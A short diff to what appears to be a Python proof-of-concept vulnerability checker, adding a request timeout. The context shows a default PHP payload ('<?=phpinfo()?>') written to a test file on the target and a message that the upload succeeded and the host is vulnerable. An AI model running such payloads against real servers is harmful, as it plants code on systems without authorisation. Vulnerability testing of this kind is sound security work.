@@ -47,7 +47,7 @@ def poc(url,payload="<?=phpinfo()?>",file="test.php"):
 
         try:
             req = urllib.request.Request(url=url_lang, headers=headers, method='GET')
-            response = urllib.request.urlopen(req)
+            response = urllib.request.urlopen(req,timeout=8)
 
             if "Successfully created" in response.read().decode('utf-8'):
                 print(f"\033[31m[+] {url_lang}文件/tmp/{file}上传成功，存在漏洞\033[0m")
